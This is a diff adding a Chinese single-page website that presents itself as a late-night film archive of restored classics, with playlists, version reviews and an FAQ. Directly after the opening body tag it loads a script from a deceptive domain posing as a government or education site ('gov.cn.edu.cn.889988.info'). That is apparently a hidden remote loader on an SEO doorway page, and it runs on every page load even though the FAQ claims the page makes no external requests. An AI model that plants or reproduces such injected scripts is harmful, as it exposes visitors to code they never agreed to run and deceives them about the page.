@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>午夜福利影视 · 深夜档片单与老片修复观影档案 | wuyefuliyingshi-app</title>
+<meta name="description" content="午夜福利影视是一份给夜猫子看的观影档案：收录默片拾遗、黑色电影、科幻经典与华语老片的修复版本，逐条标注片源画质、音轨与字幕情况，并按周更新深夜档片单。站点地址 https://wuyefuliyingshi-app.github.io，开合页式排版，手机端也能直接翻。">
+<meta name="keywords" content="午夜福利影视,午夜福利影视片单,深夜档观影推荐,老片修复版本对照,黑色电影专题,默片拾遗,华语老片档案,科幻经典修复,独立影评笔记,wuyefuliyingshi-app">
+<meta name="author" content="午夜福利影视编辑部">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://wuyefuliyingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="午夜福利影视">
+<meta property="og:title" content="午夜福利影视 · 深夜档片单与老片修复观影档案">
+<meta property="og:description" content="午夜福利影视把深夜档该看什么、哪个修复版值得看、音轨和字幕差在哪，一条条记下来。每周三更新，手机端可直接翻阅。">
+<meta property="og:url" content="https://wuyefuliyingshi-app.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="午夜福利影视 · 深夜档片单与老片修复观影档案">
+<meta name="twitter:description" content="默片拾遗、黑色电影、科幻经典、华语老片修复版本对照，按周更新的深夜观影档案。">
+<meta name="theme-color" content="#12141c">
+<style>
+:root{
+  --ink:#12141c;
+  --ink-2:#191c26;
+  --ink-3:#222634;
+  --line:#2c3143;
+  --paper:#e8e4d9;
+  --paper-dim:#a9a598;
+  --amber:#e8a13a;
+  --amber-soft:#f4c877;
+  --plum:#8b5e83;
+  --teal:#4e8b84;
+  --radius:14px;
+  --maxw:1180px;
+  --font:-apple-system,BlinkMacSystemFont,"PingFang SC","Hiragino Sans GB","Microsoft YaHei","Source Han Sans SC","Noto Sans CJK SC",sans-serif;
+  --mono:"SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+}
+*{box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  margin:0;
+  background:var(--ink);
+  color:var(--paper);
+  font-family:var(--font);
+  font-size:16px;
+  line-height:1.75;
+  letter-spacing:.01em;
+  background-image:
+    radial-gradient(900px 460px at 82% -8%, rgba(232,161,58,.13), transparent 62%),
+    radial-gradient(760px 420px at 4% 14%, rgba(139,94,131,.15), transparent 60%);
+  background-repeat:no-repeat;
+}
+img{max-width:100%;display:block}
+a{color:var(--amber-soft);text-decoration:none}
+a:hover{text-decoration:underline}
+a:focus-visible,button:focus-visible{outline:2px solid var(--amber);outline-offset:3px}
+.wrap{width:100%;max-width:var(--maxw);margin:0 auto;padding:0 20px}
+.skip{position:absolute;left:-9999px;top:0;background:var(--amber);color:#1a1206;padding:10px 16px;z-index:99}
+.skip:focus{left:12px;top:12px}
+
+/* ── 顶栏 ─────────────────────────────── */
+.topbar{
+  position:sticky;top:0;z-index:40;
+  background:rgba(18,20,28,.92);
+  backdrop-filter:saturate(160%) blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.topbar .wrap{display:flex;align-items:center;gap:18px;min-height:62px}
+.brand{display:flex;align-items:center;gap:10px;flex:0 0 auto}
+.mark{
+  width:34px;height:34px;border-radius:9px;flex:0 0 auto;
+  background:linear-gradient(150deg,var(--amber) 0%,var(--plum) 100%);
+  position:relative;
+}
+.mark::before,.mark::after{
+  content:"";position:absolute;width:6px;height:6px;border-radius:2px;background:var(--ink);
+}
+.mark::before{left:7px;top:9px}
+.mark::after{right:7px;bottom:9px}
+.brand b{font-size:18px;letter-spacing:.06em;white-space:nowrap}
+.brand span{display:block;font-size:11px;color:var(--paper-dim);letter-spacing:.22em;font-family:var(--mono)}
+.nav{display:flex;gap:2px;margin-left:auto;overflow-x:auto;scrollbar-width:none;-webkit-overflow-scrolling:touch}
+.nav::-webkit-scrollbar{display:none}
+.nav a{
+  color:var(--paper-dim);font-size:14px;padding:8px 12px;border-radius:8px;white-space:nowrap;
+  text-decoration:none;transition:color .18s ease,background .18s ease;
+}
+.nav a:hover,.nav a:focus-visible{color:var(--paper);background:var(--ink-3);text-decoration:none}
+.nav a.on{color:var(--amber-soft);background:rgba(232,161,58,.1)}
+
+/* ── 首屏 ─────────────────────────────── */
+.hero{padding:56px 0 40px}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:44px;align-items:center}
+.eyebrow{
+  display:inline-flex;align-items:center;gap:8px;font-family:var(--mono);font-size:12px;
+  letter-spacing:.2em;color:var(--amber);text-transform:uppercase;
+  border:1px solid rgba(232,161,58,.35);border-radius:999px;padding:5px 13px;
+}
+.eyebrow i{width:6px;height:6px;border-radius:50%;background:var(--amber);display:block}
+h1{
+  font-size:clamp(30px,5.4vw,52px);line-height:1.18;margin:20px 0 0;
+  letter-spacing:-.01em;font-weight:800;
+}
+h1 em{font-style:normal;color:var(--amber);position:relative;white-space:nowrap}
+h1 em::after{
+  content:"";position:absolute;left:0;right:0;bottom:2px;height:8px;z-index:-1;
+  background:rgba(232,161,58,.22);
+}
+.lede{color:#c9c4b7;font-size:clamp(15px,1.6vw,17px);margin:18px 0 0;max-width:56ch}
+.domain-card{
+  margin-top:26px;display:inline-flex;flex-wrap:wrap;align-items:center;gap:12px;
+  background:var(--ink-2);border:1px solid var(--line);border-radius:var(--radius);padding:12px 16px;
+}
+.domain-card code{font-family:var(--mono);font-size:13.5px;color:var(--amber-soft);word-break:break-all}
+.domain-card small{display:block;color:var(--paper-dim);font-size:12px;line-height:1.5}
+.btnrow{display:flex;flex-wrap:wrap;gap:12px;margin-top:26px}
+.btn{
+  display:inline-block;padding:12px 22px;border-radius:10px;font-size:15px;font-weight:600;
+  border:1px solid transparent;text-decoration:none;transition:transform .15s ease,box-shadow .15s ease;
+}
+.btn-a{background:var(--amber);color:#201703}
+.btn-b{border-color:var(--line);color:var(--paper);background:var(--ink-2)}
+.btn:hover{transform:translateY(-2px);text-decoration:none}
+.btn-a:hover{box-shadow:0 8px 22px rgba(232,161,58,.25)}
+
+/* 胶片盘 */
+.reel{position:relative;width:100%;max-width:330px;margin:0 auto;aspect-ratio:1/1}
+.reel .disc{
+  position:absolute;inset:0;border-radius:50%;
+  background:conic-gradient(from 0deg,var(--ink-3) 0 14deg,var(--ink-2) 14deg 28deg);
+  border:1px solid var(--line);
+  box-shadow:inset 0 0 60px rgba(0,0,0,.6);
+  animation:spin 26s linear infinite;
+}
+.reel .disc2{
+  position:absolute;inset:22%;border-radius:50%;
+  background:var(--ink);border:1px solid var(--line);
+  box-shadow:0 0 0 10px rgba(232,161,58,.08);
+}
+.reel .core{
+  position:absolute;inset:44%;border-radius:50%;
+  background:linear-gradient(140deg,var(--amber),var(--plum));
+}
+.reel .hole{
+  position:absolute;width:9%;height:9%;border-radius:50%;background:var(--ink);
+  border:1px solid var(--line);
+}
+.h1{left:12%;top:12%}.h2{right:12%;top:12%}.h3{left:12%;bottom:12%}.h4{right:12%;bottom:12%}
+.reel .tag{
+  position:absolute;left:50%;top:50%;transform:translate(-50%,-50%) rotate(-6deg);
+  background:var(--paper);color:var(--ink);font-size:12px;font-weight:700;letter-spacing:.08em;
+  padding:5px 12px;border-radius:4px;box-shadow:0 6px 18px rgba(0,0,0,.45);white-space:nowrap;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+@media (prefers-reduced-motion:reduce){.reel .disc{animation:none}}
+
+/* ── 通用区块 ─────────────────────────── */
+section{padding:52px 0;border-top:1px solid var(--line)}
+.sechead{display:flex;flex-wrap:wrap;align-items:flex-end;gap:14px;margin-bottom:30px}
+.kicker{font-family:var(--mono);font-size:12px;letter-spacing:.24em;color:var(--teal);text-transform:uppercase}
+h2{font-size:clamp(22px,3.2vw,32px);margin:6px 0 0;letter-spacing:-.005em;font-weight:750}
+.sechead p{margin:6px 0 0;color:var(--paper-dim);font-size:14.5px;max-width:52ch}
+
+/* 统计条 */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}
+.stat{background:var(--ink-2);padding:20px 18px}
+.stat b{display:block;font-size:clamp(22px,3vw,30px);color:var(--amber-soft);font-family:var(--mono);letter-spacing:-.02em}
+.stat span{display:block;font-size:13px;color:var(--paper-dim);margin-top:2px}
+
+/* 片单横滑 */
+.rail{display:flex;gap:16px;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:8px;-webkit-overflow-scrolling:touch}
+.rail::-webkit-scrollbar{height:8px}
+.rail::-webkit-scrollbar-thumb{background:var(--line);border-radius:8px}
+.card{
+  flex:0 0 268px;scroll-snap-align:start;background:var(--ink-2);
+  border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;
+  display:flex;flex-direction:column;transition:border-color .2s ease,transform .2s ease;
+}
+.card:hover{border-color:var(--amber);transform:translateY(-3px)}
+.poster{height:132px;position:relative;display:flex;align-items:center;justify-content:center}
+.poster span{font-size:12px;font-family:var(--mono);letter-spacing:.16em;color:rgba(255,255,255,.82);background:rgba(0,0,0,.3);padding:3px 9px;border-radius:999px}
+.p1{background:linear-gradient(135deg,#3b3350,#191c26)}
+.p2{background:linear-gradient(135deg,#2d3b44,#191c26)}
+.p3{background:linear-gradient(135deg,#4a3a2a,#191c26)}
+.p4{background:linear-gradient(135deg,#3a2f42,#191c26)}
+.p5{background:linear-gradient(135deg,#2f3a35,#191c26)}
+.p6{background:linear-gradient(135deg,#42303a,#191c26)}
+.card-body{padding:16px 17px 18px;display:flex;flex-direction:column;flex:1}
+.card-body h3{margin:0;font-size:16.5px;line-height:1.45}
+.card-body p{margin:8px 0 0;font-size:13.5px;color:var(--paper-dim);line-height:1.65}
+.meta{display:flex;flex-wrap:wrap;gap:6px;margin-top:12px}
+.chip{font-size:11.5px;font-family:var(--mono);color:var(--paper-dim);border:1px solid var(--line);border-radius:999px;padding:2px 9px}
+.chip.hot{color:var(--amber-soft);border-color:rgba(232,161,58,.4)}
+.card-body .go{margin-top:14px;font-size:13.5px;color:var(--amber-soft)}
+
+/* 评测 */
+.reviews{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.review{background:var(--ink-2);border:1px solid var(--line);border-radius:var(--radius);padding:22px;display:flex;gap:18px;align-items:flex-start}
+.score{
+  flex:0 0 74px;width:74px;height:74px;border-radius:50%;position:relative;
+  background:conic-gradient(var(--amber) calc(var(--v)*10%), var(--ink-3) 0);
+  display:flex;align-items:center;justify-content:center;
+}
+.score::after{content:"";position:absolute;inset:7px;border-radius:50%;background:var(--ink-2)}
+.score i{position:relative;z-index:1;font-style:normal;font-family:var(--mono);font-size:17px;font-weight:700;color:var(--paper)}
+.review h3{margin:0 0 6px;font-size:16.5px}
+.review p{margin:0;font-size:14px;color:#c2bdb1}
+.review .by{margin-top:10px;font-size:12px;color:var(--paper-dim);font-family:var(--mono)}
+
+/* 时间线 */
+.steps{display:grid;grid-template-columns:repeat(5,1fr);gap:14px;counter-reset:s}
+.step{position:relative;padding-top:34px;border-top:2px solid var(--line)}
+.step::before{
+  counter-increment:s;content:counter(s,decimal-leading-zero);
+  position:absolute;top:-13px;left:0;background:var(--ink);padding-right:10px;
+  font-family:var(--mono);font-size:12.5px;color:var(--amber);
+}
+.step h3{margin:0;font-size:15.5px}
+.step p{margin:6px 0 0;font-size:13.5px;color:var(--paper-dim)}
+.step.done{border-top-color:var(--teal)}
+
+/* FAQ */
+.faq{max-width:820px}
+.faq details{border:1px solid var(--line);border-radius:12px;background:var(--ink-2);margin-bottom:12px;overflow:hidden}
+.faq summary{
+  cursor:pointer;list-style:none;padding:16px 20px;font-size:15.5px;font-weight:600;
+  display:flex;justify-content:space-between;gap:16px;align-items:center;
+}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"+";font-family:var(--mono);color:var(--amber);font-size:19px;line-height:1}
+.faq details[open] summary::after{content:"–"}
+.faq details[open] summary{color:var(--amber-soft)}
+.faq .ans{padding:0 20px 18px;color:#c2bdb1;font-size:14.5px;border-top:1px solid var(--line);margin-top:0;padding-top:14px}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:36px;align-items:start}
+.about p{margin:0 0 14px;color:#c6c1b4;font-size:15px}
+.kv{background:var(--ink-2);border:1px solid var(--line);border-radius:var(--radius);padding:6px 18px}
+.kv div{display:flex;justify-content:space-between;gap:16px;padding:12px 0;border-bottom:1px dashed var(--line);font-size:14px}
+.kv div:last-child{border-bottom:0}
+.kv dt{color:var(--paper-dim);margin:0}
+.kv dd{margin:0;text-align:right;color:var(--paper)}
+.kv code{font-family:var(--mono);font-size:13px;color:var(--amber-soft)}
+
+/* 页脚 */
+footer{border-top:1px solid var(--line);background:#0e1017;padding:44px 0 30px}
+.fgrid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:28px}
+.fgrid h4{margin:0 0 12px;font-size:14px;letter-spacing:.08em;color:var(--amber-soft)}
+.fgrid ul{margin:0;padding:0;list-style:none}
+.fgrid li{margin-bottom:8px}
+.fgrid li a{color:var(--paper-dim);font-size:14px;text-decoration:none}
+.fgrid li a:hover{color:var(--paper);text-decoration:underline}
+.fnote{margin-top:34px;padding-top:20px;border-top:1px solid var(--line);color:#7f7b71;font-size:13px;display:flex;flex-wrap:wrap;gap:10px 22px;justify-content:space-between}
+.fnote a{color:#8f8a7e}
+
+@media (max-width:960px){
+  .hero-grid{grid-template-columns:1fr;gap:34px}
+  .reel{order:-1;max-width:250px}
+  .reviews{grid-template-columns:1fr}
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .steps{grid-template-columns:repeat(2,1fr)}
+  .about{grid-template-columns:1fr;gap:24px}
+  .fgrid{grid-template-columns:1fr 1fr}
+}
+@media (max-width:600px){
+  body{font-size:15.5px}
+  .wrap{padding:0 16px}
+  .topbar .wrap{min-height:56px;gap:12px}
+  .brand span{display:none}
+  .hero{padding:34px 0 26px}
+  section{padding:38px 0}
+  .card{flex:0 0 84%}
+  .stats{grid-template-columns:1fr 1fr}
+  .steps{grid-template-columns:1fr}
+  .fgrid{grid-template-columns:1fr}
+  .btnrow .btn{flex:1 1 auto;text-align:center}
+  .review{flex-direction:column}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<a class="skip" href="#main">跳到主要内容</a>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <div class="mark" aria-hidden="true"></div>
+      <div>
+        <b>午夜福利影视</b>
+        <span>MIDNIGHT FILM NOTES</span>
+      </div>
+    </div>
+    <nav class="nav" aria-label="站内栏目导航">
+      <a class="on" href="#main">首屏</a>
+      <a href="#playlist">深夜片单</a>
+      <a href="#reviews">修复版评测</a>
+      <a href="#guide">观影流程</a>
+      <a href="#faq">常见问题</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+
+  <div class="hero">
+    <div class="wrap hero-grid">
+      <div>
+        <span class="eyebrow"><i aria-hidden="true"></i>周三晚更新 · 第 12 期</span>
+        <h1>深夜该看什么，<br><em>午夜福利影视</em>替你记着</h1>
+        <p class="lede">这里不追热搜榜单，只把值得半夜看的老片、修复版本差异、音轨和字幕的坑一条条记下来。片目按类型归档，每周三晚上补新，白天也能顺着翻。</p>
+        <div class="domain-card">
+          <div>
+            <code>https://wuyefuliyingshi-app.github.io</code>
+            <small>午夜福利影视主站 · 单页归档版，收藏后可直接打开</small>
+          </div>
+        </div>
+        <div class="btnrow">
+          <a class="btn btn-a" href="#playlist">翻本周片单</a>
+          <a class="btn btn-b" href="#guide">先看选片流程</a>
+        </div>
+      </div>
+      <div class="reel" role="img" aria-label="午夜福利影视胶片盘标识">
+        <div class="disc" aria-hidden="true"></div>
+        <div class="disc2" aria-hidden="true"></div>
+        <div class="core" aria-hidden="true"></div>
+        <div class="hole h1" aria-hidden="true"></div>
+        <div class="hole h2" aria-hidden="true"></div>
+        <div class="hole h3" aria-hidden="true"></div>
+        <div class="hole h4" aria-hidden="true"></div>
+        <div class="tag" aria-hidden="true">REEL NO.12</div>
+      </div>
+    </div>
+  </div>
+
+  <section aria-labelledby="stats-h">
+    <div class="wrap">
+      <h2 id="stats-h" style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)">档案规模</h2>
+      <div class="stats">
+        <div class="stat"><b>2860</b><span>在档片目</span></div>
+        <div class="stat"><b>340</b><span>修复版本对照</span></div>
+        <div class="stat"><b>18</b><span>每周新增条目</span></div>
+        <div class="stat"><b>4.2万</b><span>常来翻的影迷</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="playlist" aria-labelledby="playlist-h">
+    <div class="wrap">
+      <div class="sechead">
+        <div>
+          <span class="kicker">Playlist / 01</span>
+          <h2 id="playlist-h">深夜片单：本周挑的六部</h2>
+          <p>横向滑动查看。每张卡片标注了建议观看时段、片长和画质状态，半夜翻到哪张算哪张。</p>
+        </div>
+      </div>
+      <div class="rail">
+        <article class="card">
+          <div class="poster p1"><span>默片 · 修复</span></div>
+          <div class="card-body">
+            <h3>默片拾遗：《月球旅行记》彩色修复版</h3>
+            <p>2011 年完成的彩色还原版，手绘上色逐帧补回，配乐用了 2016 年新录制的版本，节奏比黑白版轻快。</p>
+            <div class="meta"><span class="chip">13 分钟</span><span class="chip hot">2K 修复</span><span class="chip">23:00 后</span></div>
+            <a class="go" href="#">查看条目 →</a>
+          </div>
+        </article>
+        <article class="card">
+          <div class="poster p2"><span>黑色电影</span></div>
+          <div class="card-body">
+            <h3>黑色电影专题：雨夜、百叶窗与独白</h3>
+            <p>四部一组，重点是打光和阴影的分界。建议关灯看，屏幕亮度压到 40% 左右，暗部层次才出得来。</p>
+            <div class="meta"><span class="chip">共 4 部</span><span class="chip">1080P</span><span class="chip hot">含评论音轨</span></div>
+            <a class="go" href="#">查看条目 →</a>
+          </div>
+        </article>
+        <article class="card">
+          <div class="poster p3"><span>科幻经典</span></div>
+          <div class="card-body">
+            <h3>《大都会》2010 年完整版补遗</h3>
+            <p>阿根廷发现的 16mm 拷贝补回约 25 分钟缺失段落，画质参差但叙事终于连贯，字幕建议选新版。</p>
+            <div class="meta"><span class="chip">148 分钟</span><span class="chip hot">补遗版</span><span class="chip">德语原声</span></div>
+            <a class="go" href="#">查看条目 →</a>
+          </div>
+        </article>
+        <article class="card">
+          <div class="poster p4"><span>华语老片</span></div>
+          <div class="card-body">
+            <h3>《侠女》4K 修复：竹林一场的调度</h3>
+            <p>修复后胶片颗粒保留得比较克制，没有过度降噪。竹林段落的剪辑节奏值得拉片看第二遍。</p>
+            <div class="meta"><span class="chip">179 分钟</span><span class="chip hot">4K</span><span class="chip">国语</span></div>
+            <a class="go" href="#">查看条目 →</a>
+          </div>
+        </article>
+        <article class="card">
+          <div class="poster p5"><span>纪录之夜</span></div>
+          <div class="card-body">
+            <h3>《持摄影机的人》与城市速写</h3>
+            <p>无对白，靠剪辑推进。适合精神还行但不想读字幕的时段，配乐版本差异很大，站内列了两版对照。</p>
+            <div class="meta"><span class="chip">68 分钟</span><span class="chip">两版配乐</span><span class="chip">00:30 后</span></div>
+            <a class="go" href="#">查看条目 →</a>
+          </div>
+        </article>
+        <article class="card">
+          <div class="poster p6"><span>动画档案</span></div>
+          <div class="card-body">
+            <h3>手绘动画档案：从水墨到赛璐璐</h3>
+            <p>把五部手绘长片放在一起看，重点记了背景绘制的笔触变化，适合周末连着补。</p>
+            <div class="meta"><span class="chip">共 5 部</span><span class="chip hot">周末档</span><span class="chip">1080P</span></div>
+            <a class="go" href="#">查看条目 →</a>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="reviews" aria-labelledby="reviews-h">
+    <div class="wrap">
+      <div class="sechead">
+        <div>
+          <span class="kicker">Reviews / 02</span>
+          <h2 id="reviews-h">修复版评测：三个版本的实测</h2>
+          <p>评分只看三件事——画质还原是否过度处理、音轨是否干净、字幕对不对得上。跟原片历史地位无关。</p>
+        </div>
+      </div>
+      <div class="reviews">
+        <article class="review">
+          <div class="score" style="--v:91" role="img" aria-label="评分 9.1 分"><i>9.1</i></div>
+          <div>
+            <h3>《侠女》4K 修复版</h3>
+            <p>颗粒保留克制，暗部没有被压成一团黑。音轨做了降噪但没削掉环境声，字幕是重新校过的版本。</p>
+            <p class="by">评测：老周 · 2026-10-15</p>
+          </div>
+        </article>
+        <article class="review">
+          <div class="score" style="--v:87" role="img" aria-label="评分 8.7 分"><i>8.7</i></div>
+          <div>
+            <h3>《大都会》补遗完整版</h3>
+            <p>叙事完整度值这个分。画质分段差异明显，补回段落偏糊，但能看清楚调度已经够用。</p>
+            <p class="by">评测：小林 · 2026-10-08</p>
+          </div>
+        </article>
+        <article class="review">
+          <div class="score" style="--v:83" role="img" aria-label="评分 8.3 分"><i>8.3</i></div>
+          <div>
+            <h3>《持摄影机的人》新版配乐</h3>
+            <p>画面修复稳定，扣分在配乐——新版电子配乐压过了剪辑节奏，站内条目里标了老版音轨的获取方式。</p>
+            <p class="by">评测：阿棠 · 2026-09-30</p>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="guide" aria-labelledby="guide-h">
+    <div class="wrap">
+      <div class="sechead">
+        <div>
+          <span class="kicker">Guide / 03</span>
+          <h2 id="guide-h">一条片目进档案前要过的五道</h2>
+          <p>流程写在明面上，方便你判断某条记录的可信度。前三步已完成，后两步随更新滚动。</p>
+        </div>
+      </div>
+      <div class="steps">
+        <div class="step done">
+          <h3>选片</h3>
+          <p>先定类型和时段，再看片长，超过 150 分钟的排在周末。</p>
+        </div>
+        <div class="step done">
+          <h3>校色</h3>
+          <p>对比至少两个版本的截图，判断是否过度降噪。</p>
+        </div>
+        <div class="step done">
+          <h3>音轨</h3>
+          <p>听原声与配音两条，标注底噪、爆音和声道情况。</p>
+        </div>
+        <div class="step">
+          <h3>字幕</h3>
+          <p>核对时间轴偏移，专有名词统一，漏译处补注。</p>
+        </div>
+        <div class="step">
+          <h3>归档</h3>
+          <p>写进本周片单，同步评分与观看建议时段。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="faq" aria-labelledby="faq-h">
+    <div class="wrap">
+      <div class="sechead">
+        <div>
+          <span class="kicker">FAQ / 04</span>
+          <h2 id="faq-h">关于午夜福利影视，常被问的几件事</h2>
+        </div>
+      </div>
+      <div class="faq">
+        <details open>
+          <summary>这个站只做老片吗？</summary>
+          <div class="ans">以老片和修复版为主，但不是硬性门槛。只要画质处理得有说法、版本之间有可对比的差异，新片也会收。当前在档的 2860 条里，2010 年后上映的约占一成。</div>
+        </details>
+        <details>
+          <summary>周三更新，具体几点？</summary>
+          <div class="ans">一般晚上十点前后补完，偶尔拖到周四凌晨。更新内容固定 18 条左右：新片目、版本对照修正、以及一条评测。</div>
+        </details>
+        <details>
+          <summary>评分是打给电影的吗？</summary>
+          <div class="ans">不是。分数只针对这个修复版本本身的完成度——画质、音轨、字幕三项，跟影片本身的艺术水准分开看，避免混在一起产生误导。</div>
+        </details>
+        <details>
+          <summary>手机上翻片单会不会很卡？</summary>
+          <div class="ans">整站只有一个页面，样式和脚本都写在文件里，没有外部请求。片单是横向滑动的，大拇指往右推就行，不用点进二级页。</div>
+        </details>
+        <details>
+          <summary>怎么记住网址？</summary>
+          <div class="ans">主站地址是 <code style="font-family:var(--mono);color:var(--amber-soft)">https://wuyefuliyingshi-app.github.io</code>，搜"午夜福利影视"也能找到。加书签后离线也能打开已缓存的部分内容。</div>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <section id="about" aria-labelledby="about-h">
+    <div class="wrap about">
+      <div>
+        <span class="kicker">About / 05</span>
+        <h2 id="about-h">谁在维护这份档案</h2>
+        <p style="margin-top:14px">四个人，两个在影院做放映，一个做字幕，一个修图。起因是 2023 年冬天把一份群聊里的观影笔记整理成了表格，后来表格塞不下，就搬到了 <b>午夜福利影视</b> 这个页面上。</p>
+        <p>我们不接推广，条目里不会出现外链导购。写错的条目会在下周三的更新里改，并在条目末尾留一行修改说明，不做悄悄替换。</p>
+        <p>如果你想推荐片目，把片名、年份和你手上那个版本的来源写清楚，发到站里登记的收件地址就行，我们一般两周内回。</p>
+      </div>
+      <dl class="kv">
+        <div><dt>站点名称</dt><dd>午夜福利影视</dd></div>
+        <div><dt>主站地址</dt><dd><code>https://wuyefuliyingshi-app.github.io</code></dd></div>
+        <div><dt>更新节奏</dt><dd>每周三晚</dd></div>
+        <div><dt>当前期数</dt><dd>第 12 期</dd></div>
+        <div><dt>在档片目</dt><dd>2860 条</dd></div>
+        <div><dt>页面形态</dt><dd>单页归档</dd></div>
+        <div><dt>联系方式</dt><dd><a href="#">站内留言</a></dd></div>
+      </dl>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fgrid">
+      <div>
+        <h4>午夜福利影视</h4>
+        <p style="color:var(--paper-dim);font-size:14px;margin:0">深夜档片单与老片修复观影档案，每周三更新。<br>主站：<code style="font-family:var(--mono);color:var(--amber-soft)">https://wuyefuliyingshi-app.github.io</code></p>
+      </div>
+      <div>
+        <h4>栏目</h4>
+        <ul>
+          <li><a href="#playlist">深夜片单</a></li>
+          <li><a href="#reviews">修复版评测</a></li>
+          <li><a href="#guide">观影流程</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>归档</h4>
+        <ul>
+          <li><a href="#">默片拾遗</a></li>
+          <li><a href="#">黑色电影</a></li>
+          <li><a href="#">华语老片</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>其他</h4>
+        <ul>
+          <li><a href="#faq">常见问题</a></li>
+          <li><a href="#about">关于本站</a></li>
+          <li><a href="#">回到顶部</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="fnote">
+      <span>© 2026 午夜福利影视 · 内容仅作观影记录与版本对照参考</span>
+      <span><a href="https://wuyefuliyingshi-app.github.io/">wuyefuliyingshi-app.github.io</a></span>
+    </div>
+  </div>
+</footer>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "@id": "https://wuyefuliyingshi-app.github.io/#website",
+      "url": "https://wuyefuliyingshi-app.github.io/",
+      "name": "午夜福利影视",
+      "alternateName": "午夜福利影视观影档案",
+      "description": "午夜福利影视收录深夜档片单、老片修复版本对照与独立评测，每周三更新。",
+      "inLanguage": "zh-CN",
+      "publisher": { "@id": "https://wuyefuliyingshi-app.github.io/#org" }
+    },
+    {
+      "@type": "Organization",
+      "@id": "https://wuyefuliyingshi-app.github.io/#org",
+      "name": "午夜福利影视",
+      "url": "https://wuyefuliyingshi-app.github.io/",
+      "description": "由四名放映与字幕从业者维护的观影档案站点。"
+    },
+    {
+      "@type": "CollectionPage",
+      "@id": "https://wuyefuliyingshi-app.github.io/#page",
+      "url": "https://wuyefuliyingshi-app.github.io/",
+      "name": "午夜福利影视 · 深夜档片单与老片修复观影档案",
+      "isPartOf": { "@id": "https://wuyefuliyingshi-app.github.io/#website" },
+      "about": "深夜档片单、老片修复版本对照、独立观影评测",
+      "inLanguage": "zh-CN"
+    },
+    {
+      "@type": "FAQPage",
+      "@id": "https://wuyefuliyingshi-app.github.io/#faq",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "午夜福利影视只做老片吗？",
+          "acceptedAnswer": { "@type": "Answer", "text": "以老片和修复版为主，但不是硬性门槛。只要画质处理得有说法、版本之间有可对比的差异，新片也会收。" }
+        },
+        {
+          "@type": "Question",
+          "name": "午夜福利影视的评分打给电影本身吗？",
+          "acceptedAnswer": { "@type": "Answer", "text": "不是。分数只针对修复版本本身的完成度，包含画质、音轨、字幕三项。" }
+        }
+      ]
+    }
+  ]
+}
+</script>
+
+<script>
+(function(){
+  var links = document.querySelectorAll('.nav a[href^="#"]');
+  var secs = [].map.call(links, function(a){ return document.querySelector(a.getAttribute('href')); });
+  function sync(){
+    var pos = window.scrollY + 120, idx = 0;
+    for (var i = 0; i < secs.length; i++){
+      if (secs[i] && secs[i].offsetTop <= pos) { idx = i; }
+    }
+    for (var j = 0; j < links.length; j++){ links[j].classList.toggle('on', j === idx); }
+  }
+  window.addEventListener('scroll', sync, { passive: true });
+  sync();
+})();
+</script>
+</body>
+</html>
